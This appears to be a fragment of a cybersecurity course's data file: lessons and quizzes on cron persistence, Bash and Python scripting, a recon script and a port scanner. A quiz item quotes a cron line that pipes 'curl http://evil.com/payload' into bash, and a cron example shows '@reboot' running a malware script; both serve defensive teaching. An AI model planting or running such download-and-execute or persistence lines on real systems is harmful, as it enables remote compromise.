+          <h3>// Cron Jobs — Scheduled Tasks & Persistence</h3>
+          <p>Cron runs commands on a schedule. <strong>Attackers use cron for persistence</strong> — a scheduled task that re-runs their malware even if it is killed. Defenders hunt for suspicious cron jobs during incident response.</p>
+          <div class="code-block">crontab -e        # Edit YOUR cron jobs (opens in default editor)
+crontab -l        # List YOUR cron jobs
+cat /etc/crontab  # System-wide cron jobs
+ls /etc/cron.d/   # Additional scheduled tasks
+ls /etc/cron.daily/ /etc/cron.weekly/  # Periodic scripts
+
+# Cron time format:
+# ┌─ Minute (0-59)
+# │ ┌─ Hour (0-23)
+# │ │ ┌─ Day of month (1-31)
+# │ │ │ ┌─ Month (1-12)
+# │ │ │ │ ┌─ Day of week (0=Sun, 6=Sat)
+# │ │ │ │ │
+# * * * * * /path/to/command
+
+*/5 * * * * /home/collins/scan.sh        # Run every 5 minutes
+0 2 * * * /usr/bin/backup.sh            # Run at 2:00am daily
+@reboot /usr/bin/malware.sh             # Run on every system boot</div>
+          <div class="warn-box">⚠️ <div><strong>Incident response:</strong> Always check ALL cron locations — <code>crontab -l</code>, <code>/etc/crontab</code>, <code>/etc/cron.d/</code>, <code>/var/spool/cron/crontabs/</code>, and user crontabs. Attackers spread persistence across multiple locations.</div></div>
+          <h3>// .bashrc & Environment Variables</h3>
+          <div class="code-block">echo $PATH        # Your executable search path
+echo $HOME        # Your home directory
+env | less        # All environment variables
+export MYVAR="hello"          # Set a temporary variable
+echo $MYVAR                   # Use it
+
+# Make it permanent — add to ~/.bashrc:
+echo 'export MYVAR="hello"' >> ~/.bashrc
+source ~/.bashrc  # Reload without closing terminal
+
+# Useful aliases (add to ~/.bashrc)
+alias ll='ls -la'
+alias grep='grep --color=auto'
+alias ports='ss -tulnp'
+alias myip='ip a | grep inet'</div>
+        </div>`,
+        video:'https://www.youtube.com/embed/jwnvKOjmtEA',
+        quiz:[
+          {q:'What does "kill -9 PID" do differently from "kill PID"?',opts:['kill -9 is slower','kill -9 force-kills the process and cannot be caught or ignored by it','kill -9 only works on root processes','kill -9 sends a restart signal'],correct:1,exp:'kill sends SIGTERM (signal 15) which the process can catch and handle gracefully. kill -9 sends SIGKILL which the kernel enforces directly — the process cannot ignore or catch it.',trick:false},
+          {q:'A suspicious service called "updtr" appears when you run "systemctl list-units --state=running". What should you do?',opts:['Ignore it — it is probably a system update service','Investigate it immediately — check its binary path, when it was installed, and what it does','Delete it right away','Restart the system'],correct:1,exp:'Unexpected service names are a major red flag. Check: systemctl status updtr, which updtr, ls -la /path/to/binary, and check its installation date. Could be a backdoor.',trick:false},
+          {q:'TRICK: Cron jobs can only be created by the root user.',opts:['True','False'],correct:1,exp:'FALSE. Any user can create their own cron jobs using "crontab -e". This is why attackers who gain normal user access can still set up persistent cron jobs — and why defenders must check ALL user crontabs.',trick:true},
+          {q:'What does "@reboot" mean in a cron job?',opts:['Run once a month','Run every hour','Run once when the system boots','Run at reboot time only if the user is logged in'],correct:2,exp:'"@reboot" is a cron shorthand meaning the command runs every time the system starts. Attackers use this for persistence — their malware restarts automatically after reboots.',trick:false},
+          {q:'Which command shows you all ports that are currently listening on your system along with the process using each port?',opts:['ps aux','ip a','ss -tulnp','ping localhost'],correct:2,exp:'ss -tulnp shows TCP (-t) and UDP (-u) listening (-l) ports with numeric addresses (-n) and process info (-p). This tells you exactly which service is listening on each port.',trick:false},
+          {q:'TRICK: "source ~/.bashrc" and opening a new terminal window have exactly the same effect.',opts:['True','False'],correct:1,exp:'Almost true but not exactly. A new terminal starts a fresh login shell and loads more files (/etc/profile, ~/.profile). "source ~/.bashrc" only reloads ~/.bashrc. For most practical purposes they behave similarly, but login shells go through more initialization.',trick:true},
+          {q:'You find this cron entry: "*/1 * * * * curl http://evil.com/payload | bash". What is happening?',opts:['A legitimate update script','A persistence mechanism that downloads and executes a remote script every minute','A monitoring script','A backup job'],correct:1,exp:'This cron job runs every minute, downloads a script from evil.com, and pipes it directly to bash for execution. This is a classic attacker persistence and command-and-control mechanism.',trick:false},
+          {q:'What command would you run to check if an SSH backdoor is listening on an unusual port like 4444?',opts:['ping 4444','ss -tulnp | grep 4444','cat /etc/ssh/sshd_config | grep 4444','nmap 4444'],correct:1,exp:'ss -tulnp shows all listening ports and their processes. Filtering for 4444 quickly shows if anything is listening there and which process opened that port.',trick:false},
+          {q:'TRICK: Environment variables set with "export MYVAR=hello" persist after the terminal is closed.',opts:['True','False'],correct:1,exp:'FALSE. Variables set with export only last for the current terminal session. To make them persistent, add them to ~/.bashrc or ~/.profile so they are loaded every time a new shell starts.',trick:true},
+          {q:'What is the purpose of adding aliases to ~/.bashrc?',opts:['To make commands run as root automatically','To create shortcuts for frequently used commands that load every new session','To encrypt command history','To schedule commands'],correct:1,exp:'Aliases in ~/.bashrc create permanent shortcuts. "alias ll=\'ls -la\'" means typing "ll" runs "ls -la". They are loaded every time you open a new terminal.',trick:false},
+        ]
+      },
+      {
+        id:'m2l4', title:'Week 3 — Bash Scripting Fundamentals',
+        content:`<div class="lesson-text">
+          <h3>// What is Bash Scripting and Why Does it Matter?</h3>
+          <p>Bash scripting is automation. Instead of running 10 commands manually every time, you write a script that does it all. In cybersecurity, scripts are everywhere — pen testers write recon scripts, defenders write log parsers, and incident responders write triage tools. Both sides automate.</p>
+          <h3>// Your First Script — The Building Blocks</h3>
+          <div class="code-block">#!/bin/bash
+# ↑ Shebang line — ALWAYS the first line. Tells the system this is a bash script.
+
+# Comments start with #
+NAME="Collins"            # Variable (no spaces around =)
+echo "Hello, $NAME!"     # Print variable with $
+
+# User input
+read -p "Enter your name: " USERNAME
+echo "Welcome, $USERNAME"
+
+# Make it executable and run it:
+# chmod +x myscript.sh
+# ./myscript.sh</div>
+          <h3>// Conditionals</h3>
+          <div class="code-block">#!/bin/bash
+TARGET="192.168.1.1"
+
+# Check if host is reachable
+if ping -c 1 -W 1 $TARGET &>/dev/null; then
+  echo "$TARGET is UP"
+else
+  echo "$TARGET is DOWN"
+fi
+
+# Check if a file exists
+if [ -f /etc/passwd ]; then
+  echo "File exists"
+fi
+
+# Check if a directory exists
+if [ -d /home/collins ]; then
+  echo "Home directory exists"
+fi
+
+# String comparison
+if [ "$USERNAME" == "root" ]; then
+  echo "Running as root!"
+fi
+
+# Number comparison
+PORT=80
+if [ $PORT -eq 80 ] || [ $PORT -eq 443 ]; then
+  echo "Web port detected"
+fi</div>
+          <h3>// Loops</h3>
+          <div class="code-block">#!/bin/bash
+
+# Loop through a list
+for PORT in 22 80 443 3306 8080; do
+  echo "Checking port $PORT..."
+  nc -zv 127.0.0.1 $PORT 2>&1 | grep -q open && echo "  → OPEN"
+done
+
+# Loop through a range (ping sweep)
+for i in $(seq 1 254); do
+  ping -c 1 -W 1 192.168.1.$i &>/dev/null && \
+    echo "192.168.1.$i is alive"
+done
+
+# Loop through lines of a file (read IP list)
+while read LINE; do
+  echo "Processing: $LINE"
+done < targets.txt
+
+# Loop with counter
+COUNT=0
+while [ $COUNT -lt 10 ]; do
+  echo "Count: $COUNT"
+  COUNT=$((COUNT + 1))
+done</div>
+          <h3>// Functions & Script Arguments</h3>
+          <div class="code-block">#!/bin/bash
+
+# Functions — reusable blocks of code
+scan_host() {
+  local TARGET=$1    # $1 = first argument to function
+  echo "Scanning $TARGET..."
+  nmap -sV --open -T4 $TARGET 2>/dev/null | grep "open"
+}
+
+check_port() {
+  local HOST=$1
+  local PORT=$2
+  nc -zv $HOST $PORT 2>&1 | grep -q open && \
+    echo "$HOST:$PORT OPEN" || echo "$HOST:$PORT CLOSED"
+}
+
+# Call functions
+scan_host "192.168.1.1"
+check_port "google.com" 443
+
+# Script-level arguments ($1, $2, $3...)
+# ./script.sh 192.168.1.1 80
+# $0 = script name, $1 = first arg, $2 = second arg
+# $# = number of arguments, $@ = all arguments
+
+if [ $# -eq 0 ]; then
+  echo "Usage: $0 <target-ip>"
+  exit 1
+fi
+
+TARGET=$1
+echo "Target: $TARGET"</div>
+          <div class="tip-box">💡 <div>Start every script with argument validation. If the user does not provide required arguments, print a usage message and exit. Professional scripts always do this.</div></div>
+          <h3>// Script Output & Logging</h3>
+          <div class="code-block">#!/bin/bash
+OUTFILE="scan_$(date +%Y%m%d_%H%M%S).txt"  # Timestamped filename
+
+# Redirect output to file AND screen simultaneously
+echo "Starting scan at $(date)" | tee $OUTFILE
+nmap -sV $TARGET 2>&1 | tee -a $OUTFILE    # -a = append
+
+echo "Results saved to $OUTFILE"
+exit 0   # Exit code 0 = success, 1 = error</div>
+        </div>`,
+        video:'https://www.youtube.com/embed/v-F3YLd6oMw',
+        quiz:[
+          {q:'What is the purpose of the shebang line "#!/bin/bash" at the top of a script?',opts:['It is a comment that describes the script','It tells the operating system to use /bin/bash to interpret the script','It imports bash libraries','It sets the script permissions'],correct:1,exp:'The shebang (#!) followed by a path tells the kernel which interpreter to use. Without it, the script might run in a different shell (sh, dash) with different behavior.',trick:false},
+          {q:'In bash, what does "$1" refer to inside a script or function?',opts:['The script\'s exit code','The first argument passed to the script or function','The PID of the script','The current user'],correct:1,exp:'$1 is the first positional argument. $2 is second, $3 is third. $0 is the script name. $# is the count of arguments. $@ is all arguments as a list.',trick:false},
+          {q:'TRICK: In bash, you can use spaces around the = sign when assigning variables.',opts:['True','False'],correct:1,exp:'FALSE. In bash, variable assignment must have NO spaces: NAME="Collins" is correct. NAME = "Collins" fails because bash thinks NAME is a command and = is an argument.',trick:true},
+          {q:'What does "[ -f /etc/passwd ]" test in a bash if statement?',opts:['If /etc/passwd is empty','If /etc/passwd exists AND is a regular file','If /etc/passwd is executable','If /etc/passwd is a directory'],correct:1,exp:'-f tests if a path exists AND is a regular file. -d tests for directory, -e tests for existence of any type, -x tests if executable.',trick:false},
+          {q:'A script starts with "if [ $# -eq 0 ]". What is $# checking?',opts:['If the script is running as root','The number of arguments provided to the script','The exit code of the last command','The script\'s process ID'],correct:1,exp:'$# contains the count of arguments passed to the script. "if [ $# -eq 0 ]" checks if zero arguments were given — used to show usage messages when the user forgets to provide required input.',trick:false},
+          {q:'TRICK: "tee file.txt" writes output to file.txt but does NOT show it on screen.',opts:['True','False'],correct:1,exp:'FALSE. tee does BOTH — it writes to the file AND prints to stdout (screen) simultaneously. This is why it is useful in scripts: you can save results and watch them in real time.',trick:true},
+          {q:'What does "for i in $(seq 1 254)" do in a ping sweep script?',opts:['Creates 254 files','Loops through numbers 1 to 254, assigning each to $i','Pings 254 hosts','Creates 254 processes'],correct:1,exp:'$(seq 1 254) generates numbers 1 through 254. The for loop assigns each number to $i in turn. Combined with "ping 192.168.1.$i", you get a full subnet ping sweep.',trick:false},
+          {q:'Which bash command reads lines from a file one at a time into a variable called LINE?',opts:['read -p LINE file.txt','while read LINE; do ... done &lt; file.txt','for LINE in file.txt','cat file.txt | LINE'],correct:1,exp:'"while read LINE; do ... done &lt; file.txt" reads each line from file.txt into $LINE. This is the standard pattern for processing files line by line in bash.',trick:false},
+          {q:'TRICK: Exit code 0 in a bash script means the script encountered an error.',opts:['True','False'],correct:1,exp:'FALSE. Exit code 0 means SUCCESS in Unix/Linux. Non-zero exit codes indicate errors (1 = general error, 2 = misuse of shell, etc.). This is the opposite of most other contexts where 0 means false/failure.',trick:true},
+          {q:'A script has "local TARGET=$1" inside a function. What does "local" do?',opts:['Makes the variable available to all scripts','Makes the variable read-only','Limits the variable scope to inside the function — it does not affect variables outside','Creates a backup of the variable'],correct:2,exp:'"local" makes a variable function-scoped. Without it, $TARGET inside a function would overwrite any $TARGET variable in the rest of the script. Using local is best practice to avoid accidental overwrites.',trick:false},
+        ]
+      },
+      {
+        id:'m2l5', title:'Week 3 — Build Your Recon Script',
+        content:`<div class="lesson-text">
+          <h3>// Your First Real Security Tool</h3>
+          <p>This lesson is a hands-on project. You will build a complete reconnaissance script from scratch. This is a real tool pen testers use, and when finished it goes directly into your portfolio on GitHub.</p>
+          <div class="warn-box">⚠️ <div>Only run reconnaissance scripts against systems you own or have explicit written permission to test. Unauthorized scanning is illegal in most countries.</div></div>
+          <h3>// What Your Recon Script Will Do</h3>
+          <div class="code-block">1. Accept a target IP as a command-line argument
+2. Validate that an argument was provided
+3. Ping the target to check if it is alive
+4. Run an nmap port scan (common ports)
+5. Try to identify running services and versions
+6. Save all output to a timestamped file
+7. Print a clean summary</div>
+          <h3>// The Complete Script</h3>
+          <div class="code-block">#!/bin/bash
+# =============================================
+# basic_recon.sh — Basic Reconnaissance Script
+# Usage: ./basic_recon.sh &lt;target-ip&gt;
+# =============================================
+
+# --- Argument Validation ---
+if [ $# -eq 0 ]; then
+  echo "Usage: $0 &lt;target-ip&gt;"
+  echo "Example: $0 192.168.1.1"
+  exit 1
+fi
+
+TARGET=$1
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+OUTDIR="$HOME/cybersec/month1/recon_results"
+OUTFILE="$OUTDIR/recon_\${TARGET}_\${TIMESTAMP}.txt"
+
+# --- Setup ---
+mkdir -p $OUTDIR
+
+header() {
+  echo ""
+  echo "============================================"
+  echo "  $1"
+  echo "============================================"
+}
+
+log() {
+  echo "$1" | tee -a $OUTFILE
+}
+
+# --- Start ---
+log "RECON REPORT — Target: $TARGET"
+log "Timestamp: $(date)"
+log "Run by: $(whoami)"
+
+# --- Host Discovery ---
+header "PING TEST"
+log "$(header 'PING TEST')"
+if ping -c 3 -W 2 $TARGET &>/dev/null; then
+  log "[+] $TARGET is ALIVE"
+else
+  log "[-] $TARGET does not respond to ping"
+  log "    (Firewall may be blocking ICMP — continuing anyway)"
+fi
+
+# --- Port Scanning ---
+header "PORT SCAN — Top 1000 Ports"
+log "$(nmap -sV --open -T4 $TARGET 2>&1)"
+
+# --- Common Ports Check ---
+header "KEY PORTS"
+PORTS=(21 22 23 25 53 80 443 445 3306 3389 8080 8443)
+for PORT in "\${PORTS[@]}"; do
+  if nc -zv -w 1 $TARGET $PORT 2>&1 | grep -q "open\|succeeded"; then
+    log "[OPEN]   Port $PORT"
+  fi
+done
+
+# --- Done ---
+header "COMPLETE"
+log "Full results saved to: $OUTFILE"
+echo ""
+echo "Done. Report: $OUTFILE"</div>
+          <h3>// Setting Up and Running It</h3>
+          <div class="code-block"># 1. Create the script
+nano ~/cybersec/month1/scripts/basic_recon.sh
+# Paste the script above, save (Ctrl+O, Enter, Ctrl+X)
+
+# 2. Make it executable
+chmod +x ~/cybersec/month1/scripts/basic_recon.sh
+
+# 3. Test it on your own machine
+./basic_recon.sh 127.0.0.1
+
+# 4. View the results file
+cat ~/cybersec/month1/recon_results/recon_127.0.0.1_*.txt</div>
+          <h3>// Push to GitHub — Your First Portfolio Piece</h3>
+          <div class="code-block"># Set up git (first time only)
+git config --global user.name "Collins"
+git config --global user.email "your@email.com"
+
+# Create a repo on github.com first, then:
+cd ~/cybersec/month1/scripts
+git init
+git add basic_recon.sh
+git commit -m "Add basic recon script — Month 1 project"
+git remote add origin https://github.com/yourusername/cybersec-tools.git
+git push -u origin main</div>
+          <div class="tip-box">💡 <div>Add a README.md to your GitHub repo explaining what the script does, how to use it, and what you learned building it. Employers look at GitHub repositories — a well-documented script shows professionalism.</div></div>
+          <h3>// Extend Your Script (Challenges)</h3>
+          <div class="code-block"># Try adding these features:
+# 1. DNS lookup of the target hostname
+#    nslookup $TARGET
+
+# 2. Detect the OS using nmap OS detection
+#    sudo nmap -O $TARGET
+
+# 3. Check if common web paths exist
+#    curl -s -o /dev/null -w "%{http_code}" http://$TARGET/admin
+
+# 4. Accept multiple targets from a file
+#    while read TARGET; do ./basic_recon.sh $TARGET; done &lt; targets.txt
+
+# 5. Add color output using ANSI codes
+#    RED='\\033[0;31m'  GREEN='\\033[0;32m'  NC='\\033[0m'
+#    echo -e "\${GREEN}[+] Host is alive\${NC}"</div>
+        </div>`,
+        video:'https://www.youtube.com/embed/GtovwKDmnvs',
+        quiz:[
+          {q:'In the recon script, why do we use "tee -a $OUTFILE" instead of just ">> $OUTFILE"?',opts:['tee is faster','tee writes to the file AND displays output on screen simultaneously, while >> only appends to the file','tee creates a backup','tee compresses the output'],correct:1,exp:'tee writes to both stdout (screen) and a file at the same time. >> only redirects to the file without showing anything on screen. tee -a appends (like >>), while tee alone overwrites.',trick:false},
+          {q:'TRICK: Running "nmap -sV" on a target without permission is legal for educational purposes.',opts:['True','False'],correct:1,exp:'FALSE. Scanning systems without explicit written permission is illegal in most jurisdictions regardless of intent. Always scan only your own systems or systems you have clear authorization to test.',trick:true},
+          {q:'What does "nc -zv -w 1 192.168.1.1 80" do?',opts:['Downloads content from port 80','Tests if port 80 is open with a 1 second timeout (-z = scan mode, -v = verbose, -w = timeout)','Opens a reverse shell on port 80','Installs netcat'],correct:1,exp:'-z puts netcat in "zero-I/O" scan mode (just check if open, do not send data). -v is verbose output. -w 1 sets a 1 second timeout. Together this quickly checks if a port is open.',trick:false},
+          {q:'Why is it important to validate that "$1" was provided before using it in a script?',opts:['For performance','Without validation the script would run without a target, potentially scanning localhost or crashing with confusing errors','To check if the IP is valid','Scripts do not need argument validation'],correct:1,exp:'Without validation, if no argument is given, $TARGET would be empty. Commands like "nmap $TARGET" would either fail with confusing errors or run against unintended targets.',trick:false},
+          {q:'What does "chmod +x script.sh" do?',opts:['Compiles the script','Makes the script executable — allows it to be run directly with ./script.sh','Encrypts the script','Gives all users write access'],correct:1,exp:'+x adds the execute bit. Without it, trying to run ./script.sh gives "Permission denied". You can still run it with "bash script.sh" without execute permission, but +x is standard practice.',trick:false},
+          {q:'TRICK: "exit 0" and "exit 1" at the end of a script have identical effects.',opts:['True','False'],correct:1,exp:'FALSE. exit 0 signals SUCCESS. exit 1 (or any non-zero) signals FAILURE. Other scripts and shell conditions check exit codes: "if ./recon.sh; then echo success; fi" relies on exit 0 meaning the script worked.',trick:true},
+          {q:'When a penetration tester runs your recon script, what information does it gather that is most immediately useful?',opts:['The target\'s physical location','Open ports and service versions — which shows what software is running and potentially vulnerable','The target\'s email addresses','The target\'s CPU model'],correct:1,exp:'Open ports and service versions (from nmap -sV) reveal exactly what software is running on the target. Each service version can be checked against vulnerability databases (CVEs) to find exploits.',trick:false},
+          {q:'What is the purpose of "mkdir -p $OUTDIR" in the script?',opts:['Creates the directory and all parent directories, doing nothing if they already exist','Deletes and recreates the directory','Lists the directory contents','Makes the directory executable'],correct:0,exp:'mkdir -p creates the directory and any parent directories that do not exist yet. Without -p, if ~/cybersec/month1/ did not exist, the command would fail. -p makes it idempotent — safe to run multiple times.',trick:false},
+          {q:'TRICK: A README.md file is optional and not important for security tool repositories.',opts:['True','False'],correct:1,exp:'FALSE. A README is essential for any portfolio project. It explains what the tool does, how to install and use it, and what you learned. Employers and recruiters judge your professionalism by how well your code is documented.',trick:true},
+          {q:'The script uses "TIMESTAMP=$(date +%Y%m%d_%H%M%S)" in the filename. What is the benefit?',opts:['It makes the file name shorter','Each scan creates a uniquely named file that includes when it was run — no old results are overwritten','It encrypts the filename','It compresses the output'],correct:1,exp:'Timestamped filenames mean multiple scans against the same target create separate files (recon_192.168.1.1_20260220_143022.txt). You can compare results over time and never accidentally overwrite previous work.',trick:false},
+        ]
+      },
+      {
+        id:'m2l6', title:'Week 4 — Python for Cybersecurity',
+        content:`<div class="lesson-text">
+          <h3>// Why Python?</h3>
+          <p>Python is the language of cybersecurity. Most security tools are written in it — Metasploit modules, exploit scripts, log parsers, network tools. It is easier than C/C++ but powerful enough for production security tools.</p>
+          <div class="code-block">python3 --version    # Check Python is installed
+python3              # Start interactive Python shell (Ctrl+D to exit)
+python3 script.py    # Run a Python script</div>
+          <h3>// Python Crash Course — The Essentials</h3>
+          <div class="code-block">#!/usr/bin/env python3
+
+# --- Variables & Types ---
+target = "192.168.1.1"     # String
+port = 80                   # Integer
+is_alive = True             # Boolean
+ports = [22, 80, 443, 8080] # List
+
+# --- Print (f-strings are your best friend) ---
+print(f"Target: {target}, Port: {port}")
+
+# --- User Input ---
+target = input("Enter target IP: ")
+
+# --- If / Elif / Else ---
+if port == 80:
+    print("HTTP detected")
+elif port == 443:
+    print("HTTPS detected")
+else:
+    print(f"Unknown service on port {port}")
+
+# --- For Loop ---
+for port in [22, 80, 443]:
+    print(f"Checking port {port}")
+
+# --- While Loop ---
+count = 0
+while count &lt; 5:
+    print(f"Count: {count}")
+    count += 1
+
+# --- Functions ---
+def check_port(host, port):
+    """Check if a port is open on a given host."""
+    print(f"Checking {host}:{port}")
+    return True   # placeholder
+
+result = check_port("google.com", 80)
+
+# --- File I/O ---
+# Read from file
+with open("ips.txt", "r") as f:
+    for line in f:
+        print(line.strip())   # .strip() removes newline
+
+# Write to file
+with open("results.txt", "w") as f:
+    f.write(f"Scan of {target}\n")
+    f.write(f"Port 80: open\n")</div>
+          <h3>// The Socket Library — Network Programming</h3>
+          <p>Python's built-in socket library lets you interact with the network directly. This is how port scanners, network tools, and many exploits work at the lowest level.</p>
+          <div class="code-block">import socket
+
+# Resolve a hostname to IP
+ip = socket.gethostbyname("google.com")
+print(f"google.com resolves to: {ip}")
+
+# Check if a single port is open
+def is_port_open(host, port, timeout=1):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    result = s.connect_ex((host, port))  # 0 = open, non-zero = closed
+    s.close()
+    return result == 0
+
+if is_port_open("google.com", 443):
+    print("Port 443 is OPEN")
+
+# Get your own hostname and IP
+hostname = socket.gethostname()
+local_ip = socket.gethostbyname(hostname)
+print(f"My hostname: {hostname}, My IP: {local_ip}")</div>
+          <h3>// Log Parsing — Blue Team Python</h3>
+          <p>Blue teamers use Python to parse logs and find anomalies. This is real SOC work — identifying brute-force attempts, suspicious user agents, or unusual traffic patterns.</p>
+          <div class="code-block">#!/usr/bin/env python3
+# Parse auth.log and find top failed login IPs
+
+from collections import Counter
+
+failed_ips = []
+
+# Read the log file
+try:
+    with open("/var/log/auth.log", "r") as f:
+        for line in f:
+            if "Failed password" in line:
+                # Extract IP — it is after "from" in the line
+                parts = line.split()
+                if "from" in parts:
+                    ip_idx = parts.index("from") + 1
+                    failed_ips.append(parts[ip_idx])
+except FileNotFoundError:
+    print("auth.log not found — try /var/log/auth.log or create a test file")
+
+# Count and rank
+ip_counts = Counter(failed_ips)
+print("Top 10 failed login IPs:")
+for ip, count in ip_counts.most_common(10):
+    print(f"  {count:4d} attempts  {ip}")</div>
+          <div class="tip-box">💡 <div>Save this log parser. A version of this script is used in real SOC environments to identify brute-force attacks. It is the kind of tool that impresses interviewers — both for showing Python skill and understanding of real threats.</div></div>
+        </div>`,
+        video:'https://www.youtube.com/embed/s3lIoMcn1mY',
+        quiz:[
+          {q:'What does "socket.connect_ex((host, port))" return when a port is open?',opts:['True','The port number','0 (zero)','The service name'],correct:2,exp:'connect_ex returns 0 on success (port open) and the error number on failure (port closed/filtered). This is why we check "result == 0" to determine if a port is open.',trick:false},
+          {q:'TRICK: Python indentation is optional — it is just a style convention.',opts:['True','False'],correct:1,exp:'FALSE. Python uses indentation as SYNTAX — not just style. Incorrect indentation causes IndentationError. This is fundamentally different from most other languages where braces {} define blocks.',trick:true},
+          {q:'What does "line.strip()" do when reading lines from a file?',opts:['Removes the line from the file','Removes leading and trailing whitespace including the newline character','Splits the line into words','Converts the line to lowercase'],correct:1,exp:'strip() removes leading and trailing whitespace, including the \\n (newline) at the end of each line. Without it, you would get "192.168.1.1\\n" instead of "192.168.1.1".',trick:false},
+          {q:'What Python library is used for network socket programming?',opts:['network','requests','socket','net'],correct:2,exp:'The "socket" module is Python\'s built-in library for low-level network communication. It lets you create TCP/UDP connections, check ports, and build network tools.',trick:false},
+          {q:'In the log parser, what does "Counter(failed_ips)" do?',opts:['Counts the total number of lines in the log','Creates a dictionary counting how many times each IP address appears in the list','Removes duplicate IPs','Sorts IPs alphabetically'],correct:1,exp:'Counter from the collections module creates a dictionary where keys are items and values are counts. Counter(["1.2.3.4","1.2.3.4","5.6.7.8"]) gives {"1.2.3.4": 2, "5.6.7.8": 1}.',trick:false},
+          {q:'TRICK: "with open(file) as f:" is just a style preference — you can use "f = open(file)" instead with no difference.',opts:['True','False'],correct:1,exp:'FALSE. "with open()" is a context manager — it AUTOMATICALLY closes the file when the block ends, even if an error occurs. "f = open()" requires manual f.close() and leaves files open if an exception occurs.',trick:true},
+          {q:'What does "socket.AF_INET, socket.SOCK_STREAM" specify?',opts:['IPv6 and UDP','IPv4 and TCP','IPv4 and UDP','IPv6 and TCP'],correct:1,exp:'AF_INET = IPv4 addressing. SOCK_STREAM = TCP (reliable, connection-oriented). For UDP, you would use SOCK_DGRAM. For IPv6, AF_INET6.',trick:false},
+          {q:'A Blue Team analyst writes a Python script to parse logs and finds IP 10.0.0.99 made 847 failed login attempts in 2 minutes. What likely happened?',opts:['A user forgot their password 847 times','A brute-force or credential stuffing attack','Normal authentication behavior','A misconfigured service'],correct:1,exp:'847 failed logins in 2 minutes is a brute-force attack — an automated tool trying passwords rapidly. The analyst would block 10.0.0.99 in the firewall and alert the security team.',trick:false},
+          {q:'TRICK: Python f-strings (f"Hello {name}") only work in Python 3.9 and above.',opts:['True','False'],correct:1,exp:'FALSE. f-strings were introduced in Python 3.6. They work in any Python 3.6+ version. As of 2026, Python 3.10+ is standard, so f-strings are safe to use everywhere.',trick:true},
+          {q:'Why do security tools use "s.settimeout(1)" when scanning ports?',opts:['To slow down the scan for stealth','To limit the wait time per port — without a timeout, scanning closed/filtered ports could wait forever','To encrypt the connection','To avoid detection by IDS'],correct:1,exp:'Without a timeout, connect() on a filtered port can hang indefinitely. Setting a short timeout (0.5-2 seconds) means the scanner moves on quickly. This dramatically speeds up port scanning.',trick:false},
+        ]
+      },
+      {
+        id:'m2l7', title:'Week 4 — Build Your Python Port Scanner',
+        content:`<div class="lesson-text">
+          <h3>// Your Second Portfolio Project</h3>
+          <p>You are going to build a working Python port scanner. This is a real tool that penetration testers use daily. When finished, it will demonstrate both Python skill and understanding of network security fundamentals.</p>
+          <h3>// The Complete Port Scanner</h3>
+          <div class="code-block">#!/usr/bin/env python3
+"""
+port_scanner.py — Python Port Scanner
+Usage: python3 port_scanner.py &lt;target&gt; [start_port] [end_port]
+Example: python3 port_scanner.py 192.168.1.1 1 1024
+"""
+
+import socket
+import sys
+import concurrent.futures
+from datetime import datetime
+
+# ─── Well-known port names ───────────────────────────────────────
+PORT_NAMES = {
+    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
+    53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
+    443: "HTTPS", 445: "SMB", 3306: "MySQL",
+    3389: "RDP", 5432: "PostgreSQL", 8080: "HTTP-Alt", 8443: "HTTPS-Alt"
+}
+
+# ─── Single port check ───────────────────────────────────────────
+def scan_port(host, port, timeout=0.5):
+    """Returns port number if open, None if closed."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        result = s.connect_ex((host, port))
+        s.close()
+        if result == 0:
+            return port
+    except socket.error:
+        pass
+    return None
+
+# ─── Main scan function ──────────────────────────────────────────
+def run_scan(target, start_port=1, end_port=1024):
+    open_ports = []
+
+    # Resolve hostname to IP
+    try:
+        ip = socket.gethostbyname(target)
+    except socket.gaierror:
+        print(f"[!] Cannot resolve {target}")
+        sys.exit(1)
+
+    print(f"\n{'='*50}")
+    print(f"  Port Scanner — Target: {target} ({ip})")
+    print(f"  Scanning ports {start_port}-{end_port}")
+    print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"{'='*50}\n")
+
+    # Use threads to scan multiple ports simultaneously
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+        futures = {executor.submit(scan_port, ip, port): port
+                   for port in range(start_port, end_port + 1)}
+
+        for future in concurrent.futures.as_completed(futures):
+            result = future.result()
+            if result is not None:
+                service = PORT_NAMES.get(result, "Unknown")
+                print(f"  [OPEN]  Port {result:5d}  →  {service}")
+                open_ports.append(result)
+
+    open_ports.sort()
+    print(f"\n{'='*50}")
+    print(f"  Scan complete. {len(open_ports)} open port(s) found.")
+    print(f"  Finished: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"{'='*50}\n")
+
+    return open_ports
+
+# ─── Entry point ────────────────────────────────────────────────
+if __name__ == "__main__":
+    if len(sys.argv) &lt; 2:
+        print(f"Usage: {sys.argv[0]} &lt;target&gt; [start] [end]")
+        print(f"  python3 {sys.argv[0]} 127.0.0.1")
+        print(f"  python3 {sys.argv[0]} 192.168.1.1 1 1024")
+        sys.exit(1)
+
+    target = sys.argv[1]
+    start  = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 1
+    end    = int(sys.argv[3]) if len(sys.argv) &gt; 3 else 1024
+
+    run_scan(target, start, end)</div>
+          <h3>// Save and Run It</h3>
+          <div class="code-block"># Save the script
+nano ~/cybersec/month1/scripts/port_scanner.py
+
+# Run on your own machine (safe to do)
+python3 port_scanner.py 127.0.0.1
+
+# Run on a specific port range
+python3 port_scanner.py 127.0.0.1 1 100
+
+# Time the scan (ThreadPoolExecutor makes it fast)
+time python3 port_scanner.py 127.0.0.1 1 1024</div>
+          <div class="tip-box">💡 <div>The ThreadPoolExecutor scans 100 ports simultaneously instead of one at a time. This is the difference between a 20-minute scan and a 20-second scan. Concurrency is essential in security tooling.</div></div>
+          <h3>// Month 1 Complete — What You Have Built</h3>
+          <div class="code-block">Your portfolio after Month 1:
+
+  GitHub Repository: cybersec-tools/
+  ├── basic_recon.sh        — Bash recon script with nmap + ping sweep
+  ├── port_scanner.py       — Multithreaded Python port scanner
+  ├── log_parser.py         — Python auth.log brute-force detector
+  └── README.md             — Documentation with usage examples
+
+Skills Demonstrated:
+  ✓ Linux command line proficiency
+  ✓ Bash scripting for automation
+  ✓ Python network programming
